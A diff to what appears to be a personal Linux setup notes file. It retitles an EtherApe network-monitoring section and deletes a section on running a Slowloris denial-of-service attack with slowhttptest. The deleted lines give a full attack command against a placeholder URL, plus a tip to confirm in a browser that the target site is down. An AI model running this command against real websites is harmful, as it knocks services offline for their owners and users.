@@ -170,7 +170,7 @@ for a nice minimal interface choose Options > Preferences > Interface > Gui: Min
 for volume shorcut, press "9" to Decrease audio volume, press "0" to Increase audio volume
 
 ##################################
-# monitoring graphical network
+# Monitoring graphical network with EtherApe
 ##################################
 open octopi
 install etherape
@@ -178,17 +178,6 @@ right click on etherape icon
 edit application
 tab application -> Advanced Options -> Run as different user -> root
 OK
-
-##################################
-# slowloris with slowhttptest
-##################################
-open octopi
-install slowhttptest
-use 1000 connections (-c 1000) with the Slowloris mode (-H), and generate statistics (-g> with the output file name (-o slowhttp). Use 10 seconds to wait for data (-i 10), 200 connections (-r 200) with GET requests (-t GET) against the target URL (-u http://domain.com/index.php) with a maximum of length of 24 bytes (-x 24) and a 2 second time out (-p 2):
-$
-$ slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://domain.com/index.php -x 24 -p 2
-$
-don't trust always the service available message, just try accessing the real website from a browser and you will see if it works or not
 
 ##################################
 # Install Sublime Text
